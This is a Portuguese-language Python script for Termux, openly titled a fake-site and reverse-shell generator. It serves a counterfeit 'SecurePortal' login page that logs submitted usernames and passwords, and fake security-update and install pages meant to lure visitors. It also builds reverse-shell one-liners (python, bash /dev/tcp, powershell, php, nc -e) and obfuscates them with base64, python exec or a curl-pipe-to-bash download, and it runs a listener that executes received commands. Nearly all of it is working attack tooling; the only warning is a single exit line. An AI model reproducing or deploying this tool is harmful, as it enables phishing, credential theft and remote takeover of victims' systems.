#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import socket
import threading
import subprocess
import base64
import hashlib
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, quote
from typing import Dict, List, Optional

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax
from rich.layout import Layout
from rich.live import Live
from rich.align import Align

console = Console()

class FakeSiteHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.payloads = kwargs.pop('payloads', {})
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        client_ip = self.client_address[0]
        console.print(f"[yellow]📥 GET de {client_ip}: {self.path}[/yellow]")
        
        # Páginas diferentes para diferentes caminhos
        if self.path == '/':
            self.serve_login_page()
        elif self.path == '/update':
            self.serve_update_page()
        elif self.path == '/login':
            self.serve_login_page()
        elif self.path == '/dashboard':
            self.serve_dashboard()
        elif self.path == '/download':
            self.serve_download_page()
        elif self.path == '/install':
            self.serve_install_page()
        elif self.path == '/payload':
            self.serve_payload()
        elif self.path == '/shell':
            self.serve_shell()
        else:
            self.serve_404()
    
    def do_POST(self):
        client_ip = self.client_address[0]
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        console.print(f"[yellow]📨 POST de {client_ip}: {self.path}[/yellow]")
        
        if self.path == '/login':
            self.process_login(post_data)
        elif self.path == '/download':
            self.process_download(post_data)
        else:
            self.send_response(404)
            self.end_headers()
    
    def serve_login_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html_content = """
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Sistema de Autenticação - Portal Seguro</title>
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    height: 100vh;
                    margin: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }
                .login-container {
                    background: white;
                    padding: 30px;
                    border-radius: 10px;
                    box-shadow: 0 10px 25px rgba(0,0,0,0.2);
                    width: 350px;
                }
                .logo {
                    text-align: center;
                    margin-bottom: 20px;
                }
                .logo h1 {
                    color: #333;
                    margin: 0;
                }
                .logo span {
                    color: #667eea;
                    font-size: 12px;
                }
                input[type="text"], input[type="password"] {
                    width: 100%;
                    padding: 12px;
                    margin: 8px 0;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                    box-sizing: border-box;
                }
                button {
                    background-color: #667eea;
                    color: white;
                    padding: 12px 20px;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    width: 100%;
                    font-size: 16px;
                }
                button:hover {
                    background-color: #5a67d8;
                }
                .footer {
                    text-align: center;
                    margin-top: 20px;
                    font-size: 12px;
                    color: #666;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <div class="logo">
                    <h1>🔒 SecurePortal</h1>
                    <span>Sistema de Autenticação Segura</span>
                </div>
                <form action="/login" method="POST">
                    <input type="text" name="username" placeholder="Usuário" required>
                    <input type="password" name="password" placeholder="Senha" required>
                    <button type="submit">Acessar Sistema</button>
                </form>
                <div class="footer">
                    © 2024 SecureSystems - Todos os direitos reservados
                </div>
            </div>
        </body>
        </html>
        """
        self.wfile.write(html_content.encode())
    
    def serve_update_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Atualização de Sistema</title>
            <meta charset="UTF-8">
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .update-box { border: 1px solid #ccc; padding: 20px; border-radius: 5px; }
                .btn { background: #007bff; color: white; padding: 10px 15px; border: none; border-radius: 3px; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="update-box">
                <h2>📦 Atualização Disponível</h2>
                <p>Uma nova atualização de segurança está disponível para seu sistema.</p>
                <p><strong>Versão 2.3.4</strong> - Correções críticas de segurança</p>
                <button class="btn" onclick="installUpdate()">Instalar Atualização</button>
            </div>
            <script>
                function installUpdate() {
                    document.body.innerHTML = '<h2>⏳ Instalando atualização...</h2><p>Por favor, aguarde. Não feche esta página.</p>';
                    setTimeout(() => { 
                        window.location.href = '/install'; 
                    }, 2000);
                }
            </script>
        </body>
        </html>
        """
        self.wfile.write(html_content.encode())
    
    def serve_dashboard(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Dashboard - Sistema Seguro</title>
            <meta charset="UTF-8">
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .header { background: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
                .card { border: 1px solid #ddd; padding: 15px; border-radius: 5px; margin-bottom: 15px; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🏠 Dashboard do Sistema</h1>
                <p>Bem-vindo ao painel de controle seguro</p>
            </div>
            
            <div class="card">
                <h3>📊 Estatísticas do Sistema</h3>
                <p>Status: <span style="color:green">●</span> Online</p>
                <p>Usuários ativos: 12</p>
            </div>
            
            <div class="card">
                <h3>🔔 Notificações</h3>
                <p>Verifique as atualizações de segurança em <a href="/update">/update</a></p>
            </div>
        </body>
        </html>
        """
        self.wfile.write(html_content.encode())
    
    def serve_download_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Download - Software Oficial</title>
            <meta charset="UTF-8">
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .download-box { border: 1px solid #ccc; padding: 20px; border-radius: 5px; }
                .btn { background: #28a745; color: white; padding: 10px 15px; border: none; border-radius: 3px; cursor: pointer; margin: 5px; }
            </style>
        </head>
        <body>
            <div class="download-box">
                <h2>⬇️ Download do Software</h2>
                <p>Selecione a versão para download:</p>
                
                <form action="/download" method="POST">
                    <input type="radio" id="win" name="os" value="windows" checked>
                    <label for="win">Windows</label><br>
                    
                    <input type="radio" id="mac" name="os" value="macos">
                    <label for="mac">macOS</label><br>
                    
                    <input type="radio" id="linux" name="os" value="linux">
                    <label for="linux">Linux</label><br><br>
                    
                    <button type="submit" class="btn">Iniciar Download</button>
                </form>
            </div>
        </body>
        </html>
        """
        self.wfile.write(html_content.encode())
    
    def serve_install_page(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Instalação em Andamento</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; text-align: center; }
                .progress { 
                    height: 20px; 
                    background-color: #f5f5f5; 
                    border-radius: 4px; 
                    margin: 20px 0; 
                    overflow: hidden;
                }
                .progress-bar {
                    height: 100%;
                    background-color: #007bff;
                    width: 0%;
                    transition: width 0.5s;
                }
            </style>
        </head>
        <body>
            <h2>⏳ Instalando Atualização de Segurança</h2>
            <p>Por favor, aguarde. Não feche esta página.</p>
            
            <div class="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <p id="status">Inicializando...</p>
            
            <script>
                var progress = 0;
                var interval = setInterval(function() {
                    progress += 5;
                    document.getElementById('progressBar').style.width = progress + '%';
                    
                    if (progress < 30) {
                        document.getElementById('status').innerText = 'Baixando pacotes...';
                    } else if (progress < 60) {
                        document.getElementById('status').innerText = 'Verificando integridade...';
                    } else if (progress < 90) {
                        document.getElementById('status').innerText = 'Aplicando atualização...';
                    } else {
                        document.getElementById('status').innerText = 'Finalizando...';
                    }
                    
                    if (progress >= 100) {
                        clearInterval(interval);
                        setTimeout(function() {
                            window.location.href = '/payload';
                        }, 1000);
                    }
                }, 200);
            </script>
        </body>
        </html>
        """
        self.wfile.write(html_content.encode())
    
    def serve_payload(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Executar payload em segundo plano
        try:
            if 'payload' in self.payloads:
                payload = self.payloads['payload']
                # Executar o payload em uma thread separada
                threading.Thread(target=self.execute_payload, args=(payload,)).start()
        except Exception as e:
            console.print(f"[red]❌ Erro ao executar payload: {e}[/red]")
        
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Instalação Concluída</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; text-align: center; }
                .success { color: #28a745; font-size: 24px; }
            </style>
        </head>
        <body>
            <div class="success">
                <h2>✅ Instalação Concluída com Sucesso!</h2>
                <p>Seu sistema está agora atualizado e seguro.</p>
                <p>Você pode fechar esta janela.</p>
            </div>
        </body>
        </html>
        """
        self.wfile.write(html_content.encode())
    
    def serve_shell(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Terminal Web</title>
            <style>
                body { font-family: monospace; margin: 20px; background: #000; color: #0f0; }
                #terminal { width: 100%; height: 80vh; overflow: auto; }
                .input-line { display: flex; }
                .prompt { color: #0f0; margin-right: 5px; }
                input { background: transparent; border: none; color: #0f0; outline: none; font-family: monospace; width: 80%; }
            </style>
        </head>
        <body>
            <div id="terminal"></div>
            <div class="input-line">
                <span class="prompt">$</span>
                <input type="text" id="command" autofocus>
            </div>
            
            <script>
                const terminal = document.getElementById('terminal');
                const commandInput = document.getElementById('command');
                
                function addOutput(text) {
                    const line = document.createElement('div');
                    line.textContent = text;
                    terminal.appendChild(line);
                    terminal.scrollTop = terminal.scrollHeight;
                }
                
                commandInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        const command = commandInput.value;
                        addOutput('$ ' + command);
                        commandInput.value = '';
                        
                        // Enviar comando para o servidor
                        fetch('/execute', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ command: command })
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.output) {
                                addOutput(data.output);
                            }
                        })
                        .catch(error => {
                            addOutput('Erro: ' + error);
                        });
                    }
                });
                
                addOutput('Terminal Web inicializado. Digite um comando:');
            </script>
        </body>
        </html>
        """
        self.wfile.write(html_content.encode())
    
    def serve_404(self):
        self.send_response(404)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>404 - Pagina nao encontrada</h1>')
    
    def process_login(self, post_data):
        parsed_data = parse_qs(post_data)
        username = parsed_data.get('username', [''])[0]
        password = parsed_data.get('password', [''])[0]
        
        console.print(f"[red]🔓 Tentativa de login: {username}:{password}[/red]")
        
        # Redirecionar para dashboard
        self.send_response(302)
        self.send_header('Location', '/dashboard')
        self.end_headers()
    
    def process_download(self, post_data):
        parsed_data = parse_qs(post_data)
        os_type = parsed_data.get('os', ['windows'])[0]
        
        console.print(f"[yellow]📥 Download solicitado para: {os_type}[/yellow]")
        
        # Redirecionar para instalação
        self.send_response(302)
        self.send_header('Location', '/install')
        self.end_headers()
    
    def execute_payload(self, payload):
        try:
            console.print(f"[green]🚀 Executando payload...[/green]")
            if payload.startswith("python"):
                subprocess.run(payload.split(), capture_output=True, timeout=10)
            else:
                subprocess.run(payload, shell=True, capture_output=True, timeout=10)
            console.print(f"[green]✅ Payload executado com sucesso[/green]")
        except Exception as e:
            console.print(f"[red]❌ Erro ao executar payload: {e}[/red]")

class ReverseShellManager:
    def __init__(self):
        self.active_shells = {}
        self.shell_types = {
            'python': self.generate_python_shell,
            'bash': self.generate_bash_shell,
            'powershell': self.generate_powershell_shell,
            'php': self.generate_php_shell,
            'netcat': self.generate_netcat_shell
        }
    
    def generate_python_shell(self, ip: str, port: int) -> str:
        return f"""python3 -c \"import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])\""""
    
    def generate_bash_shell(self, ip: str, port: int) -> str:
        return f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    
    def generate_powershell_shell(self, ip: str, port: int) -> str:
        return f"""powershell -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """
    
    def generate_php_shell(self, ip: str, port: int) -> str:
        return f"php -r \"$sock=fsockopen('{ip}',{port});exec('/bin/sh -i <&3 >&3 2>&3');\""
    
    def generate_netcat_shell(self, ip: str, port: int) -> str:
        return f"nc -e /bin/sh {ip} {port}"
    
    def start_listener(self, port: int):
        """Inicia um listener na porta especificada"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('0.0.0.0', port))
                s.listen(1)
                console.print(f"[green]👂 Ouvindo na porta {port}...[/green]")
                conn, addr = s.accept()
                console.print(f"[green]✅ Conexão recebida de {addr}[/green]")
                
                with conn:
                    conn.sendall(b"Shell reverso conectado com sucesso!\n")
                    while True:
                        try:
                            data = conn.recv(1024)
                            if not data:
                                break
                            console.print(f"[cyan]📨 Dados: {data.decode()}[/cyan]")
                            
                            # Executar comando se começar com "cmd:"
                            if data.decode().startswith("cmd:"):
                                command = data.decode()[4:].strip()
                                try:
                                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                                    output = result.stdout + result.stderr
                                    conn.sendall(output.encode())
                                except Exception as e:
                                    conn.sendall(f"Erro executando comando: {e}".encode())
                        except:
                            break
        except Exception as e:
            console.print(f"[red]❌ Erro no listener: {e}[/red]")

class FakeSiteGenerator:
    def __init__(self):
        self.server = None
        self.server_thread = None
        self.shell_manager = ReverseShellManager()
        self.payloads = {}
        
    def start_server(self, port: int, payload: str = ""):
        """Inicia o servidor HTTP fake"""
        try:
            self.payloads['payload'] = payload
            
            # Criar handler personalizado com payloads
            def handler(*args):
                FakeSiteHandler(*args, payloads=self.payloads)
            
            self.server = HTTPServer(('0.0.0.0', port), handler)
            console.print(f"[green]🌐 Servidor iniciado em http://0.0.0.0:{port}[/green]")
            
            # Iniciar em thread separada
            self.server_thread = threading.Thread(target=self.server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            return True
        except Exception as e:
            console.print(f"[red]❌ Erro ao iniciar servidor: {e}[/red]")
            return False
    
    def stop_server(self):
        """Para o servidor HTTP"""
        if self.server:
            self.server.shutdown()
            console.print("[yellow]⏹️ Servidor parado[/yellow]")
    
    def generate_shell_payload(self, shell_type: str, ip: str, port: int) -> str:
        """Gera payload de shell reverso"""
        if shell_type in self.shell_manager.shell_types:
            return self.shell_manager.shell_types[shell_type](ip, port)
        return ""
    
    def obfuscate_payload(self, payload: str, technique: str) -> str:
        """Ofusca o payload usando diferentes técnicas"""
        if technique == "base64":
            encoded = base64.b64encode(payload.encode()).decode()
            return f"echo '{encoded}' | base64 -d | bash"
        elif technique == "python_exec":
            encoded = base64.b64encode(payload.encode()).decode()
            return f"python3 -c \"exec(__import__('base64').b64decode('{encoded}').decode())\""
        elif technique == "curl_pipe":
            # Esta é uma simulação - na prática precisaria hospedar o payload
            return f"curl -s http://example.com/payload.sh | bash -s -- {hashlib.md5(payload.encode()).hexdigest()[:8]}"
        return payload

class FakeSitePanel:
    def __init__(self):
        self.generator = FakeSiteGenerator()
        self.banner = """
[bold red]
    ╔═╗┌─┐┌─┐┬ ┬  ╔═╗┬┌┬┐┌─┐  ╔═╗┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐
    ╠═╝├─┤│  ├─┤  ║ ║│ │ │ │  ║  ├─┤├┤ │  ├┴┐├┤ ├┬┘
    ╩  ┴ ┴└─┘┴ ┴  ╚═╝┴ ┴ └─┘  ╚═╝┴ ┴└─┘└─┘┴ ┴└─┘┴└─
[/bold red]
[bold white on red]        GERADOR DE SITES FAKE - SHELL REVERSO v2.0[/bold white on red]
"""
        self.server_status = "Parado"
        self.listener_status = "Parado"
    
    def show_menu(self):
        """Mostra o menu principal"""
        while True:
            console.clear()
            console.print(self.banner)
            
            # Status do servidor
            status_panel = Panel.fit(
                f"[cyan]🌐 Servidor:[/cyan] {self.server_status}\n"
                f"[cyan]👂 Listener:[/cyan] {self.listener_status}",
                title="[bold]Status[/bold]",
                border_style="blue"
            )
            console.print(status_panel)
            
            table = Table(
                title="[bold cyan]🎭 MENU PRINCIPAL[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            table.add_column("Opção", style="cyan", width=10)
            table.add_column("Descrição", style="green")
            table.add_column("Status", style="yellow")
            
            table.add_row("1", "Iniciar Servidor Fake", "🌐")
            table.add_row("2", "Gerar Payload Shell", "🐚")
            table.add_row("3", "Iniciar Listener", "👂")
            table.add_row("4", "Templates de Site", "📋")
            table.add_row("5", "Técnicas de Ofuscação", "🔒")
            table.add_row("6", "Parar Servidor", "⏹️")
            table.add_row("0", "Sair", "🚪")
            
            console.print(table)
            
            choice = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3", "4", "5", "6"],
                show_choices=False
            )
            
            if choice == "1":
                self.start_fake_server()
            elif choice == "2":
                self.generate_shell_payload()
            elif choice == "3":
                self.start_listener()
            elif choice == "4":
                self.show_templates()
            elif choice == "5":
                self.show_obfuscation_techniques()
            elif choice == "6":
                self.stop_server()
            elif choice == "0":
                self.exit_program()
    
    def start_fake_server(self):
        """Inicia o servidor fake"""
        console.print(Panel.fit(
            "[bold]🌐 CONFIGURAÇÃO DO SERVIDOR FAKE[/bold]",
            border_style="blue"
        ))
        
        port = IntPrompt.ask(
            "[yellow]?[/yellow] Porta do servidor",
            default=8080
        )
        
        # Verificar se porta está disponível
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.bind(('0.0.0.0', port))
            test_socket.close()
        except:
            console.print("[red]❌ Porta já em uso![/red]")
            input("\nPressione Enter para voltar...")
            return
        
        # Perguntar se quer usar um payload
        payload = ""
        if Confirm.ask("[yellow]?[/yellow] Incluir payload de shell reverso?"):
            shell_type = Prompt.ask(
                "[yellow]?[/yellow] Tipo de shell",
                choices=list(self.generator.shell_manager.shell_types.keys()),
                default="python"
            )
            
            ip = Prompt.ask(
                "[yellow]?[/yellow] IP para conexão reversa",
                default=socket.gethostbyname(socket.gethostname())
            )
            
            port_shell = IntPrompt.ask(
                "[yellow]?[/yellow] Porta para conexão",
                default=4444
            )
            
            payload = self.generator.generate_shell_payload(shell_type, ip, port_shell)
            
            # Ofuscar payload
            if Confirm.ask("[yellow]?[/yellow] Ofuscar payload?"):
                technique = Prompt.ask(
                    "[yellow]?[/yellow] Técnica de ofuscação",
                    choices=["base64", "python_exec", "curl_pipe"],
                    default="base64"
                )
                payload = self.generator.obfuscate_payload(payload, technique)
            
            console.print(Panel.fit(
                f"[bold]📋 PAYLOAD GERADO:[/bold]\n\n[cyan]{payload}[/cyan]",
                title="[green]PAYLOAD[/green]",
                border_style="green"
            ))
        
        if self.generator.start_server(port, payload):
            self.server_status = f"Rodando em http://0.0.0.0:{port}"
            console.print(Panel.fit(
                f"[green]✅ Servidor iniciado com sucesso![/green]\n"
                f"[cyan]URL: http://0.0.0.0:{port}[/cyan]\n"
                f"[cyan]Login: http://0.0.0.0:{port}/login[/cyan]\n"
                f"[cyan]Update: http://0.0.0.0:{port}/update[/cyan]\n"
                f"[cyan]Download: http://0.0.0.0:{port}/download[/cyan]",
                title="[green]SUCESSO[/green]",
                border_style="green"
            ))
        
        input("\nPressione Enter para voltar...")
    
    def generate_shell_payload(self):
        """Gera payload de shell reverso"""
        console.print(Panel.fit(
            "[bold]🐚 GERADOR DE PAYLOAD SHELL[/bold]",
            border_style="blue"
        ))
        
        shell_type = Prompt.ask(
            "[yellow]?[/yellow] Tipo de shell",
            choices=list(self.generator.shell_manager.shell_types.keys()),
            default="python"
        )
        
        ip = Prompt.ask(
            "[yellow]?[/yellow] IP para conexão reversa",
            default=socket.gethostbyname(socket.gethostname())
        )
        
        port = IntPrompt.ask(
            "[yellow]?[/yellow] Porta para conexão",
            default=4444
        )
        
        # Gerar payload
        payload = self.generator.generate_shell_payload(shell_type, ip, port)
        
        # Ofuscar payload
        if Confirm.ask("[yellow]?[/yellow] Ofuscar payload?"):
            technique = Prompt.ask(
                "[yellow]?[/yellow] Técnica de ofuscação",
                choices=["base64", "python_exec", "curl_pipe"],
                default="base64"
            )
            payload = self.generator.obfuscate_payload(payload, technique)
        
        console.print(Panel.fit(
            f"[bold]📋 PAYLOAD GERADO:[/bold]\n\n[cyan]{payload}[/cyan]",
            title="[green]PAYLOAD[/green]",
            border_style="green"
        ))
        
        if Confirm.ask("[yellow]?[/yellow] Salvar em arquivo?"):
            filename = Prompt.ask(
                "[yellow]?[/yellow] Nome do arquivo",
                default="payload.sh"
            )
            try:
                with open(filename, 'w') as f:
                    f.write(payload)
                console.print(f"[green]✅ Salvo como {filename}[/green]")
            except Exception as e:
                console.print(f"[red]❌ Erro ao salvar: {e}[/red]")
        
        input("\nPressione Enter para voltar...")
    
    def start_listener(self):
        """Inicia listener para shell reverso"""
        console.print(Panel.fit(
            "[bold]👂 CONFIGURAÇÃO DO LISTENER[/bold]",
            border_style="blue"
        ))
        
        port = IntPrompt.ask(
            "[yellow]?[/yellow] Porta para escutar",
            default=4444
        )
        
        # Verificar se porta está disponível
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.bind(('0.0.0.0', port))
            test_socket.close()
        except:
            console.print("[red]❌ Porta já em uso![/red]")
            input("\nPressione Enter para voltar...")
            return
        
        console.print(f"[yellow]⚠️ Iniciando listener na porta {port}...[/yellow]")
        console.print("[yellow]⚠️ Pressione Ctrl+C para parar[/yellow]")
        
        self.listener_status = f"Ouvindo na porta {port}"
        
        try:
            # Iniciar listener em thread separada
            listener_thread = threading.Thread(
                target=self.generator.shell_manager.start_listener,
                args=(port,)
            )
            listener_thread.daemon = True
            listener_thread.start()
            
            # Manter thread principal ativa
            while listener_thread.is_alive():
                time.sleep(1)
                
        except KeyboardInterrupt:
            console.print("\n[yellow]⏹️ Listener interrompido[/yellow]")
        except Exception as e:
            console.print(f"[red]❌ Erro no listener: {e}[/red]")
        
        self.listener_status = "Parado"
        input("\nPressione Enter para voltar...")
    
    def show_templates(self):
        """Mostra templates de site disponíveis"""
        console.print(Panel.fit(
            "[bold]📋 TEMPLATES DE SITE DISPONÍVEIS[/bold]",
            border_style="blue"
        ))
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Template", style="cyan")
        table.add_column("Descrição", style="green")
        table.add_column("URL", style="yellow")
        
        table.add_row("Login", "Página de login fake", "/")
        table.add_row("Update", "Página de atualização", "/update")
        table.add_row("Dashboard", "Painel administrativo", "/dashboard")
        table.add_row("Download", "Página de download", "/download")
        table.add_row("Install", "Página de instalação", "/install")
        table.add_row("Payload", "Execução de payload", "/payload")
        table.add_row("Shell", "Terminal web", "/shell")
        
        console.print(table)
        input("\nPressione Enter para voltar...")
    
    def show_obfuscation_techniques(self):
        """Mostra técnicas de ofuscação"""
        console.print(Panel.fit(
            "[bold]🔒 TÉCNICAS DE OFUSCAÇÃO[/bold]",
            border_style="blue"
        ))
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Técnica", style="cyan")
        table.add_column("Descrição", style="green")
        table.add_column("Exemplo", style="yellow")
        
        table.add_row("base64", "Codifica payload em base64", "echo 'payload' | base64 -d | bash")
        table.add_row("python_exec", "Executa via Python", "python3 -c \"exec('base64_payload')\"")
        table.add_row("curl_pipe", "Download e execução remota", "curl http://ex.com/payload | bash")
        
        console.print(table)
        input("\nPressione Enter para voltar...")
    
    def stop_server(self):
        """Para o servidor"""
        self.generator.stop_server()
        self.server_status = "Parado"
        console.print("[green]✅ Servidor parado com sucesso[/green]")
        time.sleep(1)
    
    def exit_program(self):
        """Sai do programa"""
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! ⚠️[/blink bold red]",
            border_style="red"
        ))
        self.generator.stop_server()
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        panel = FakeSitePanel()
        panel.show_menu()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
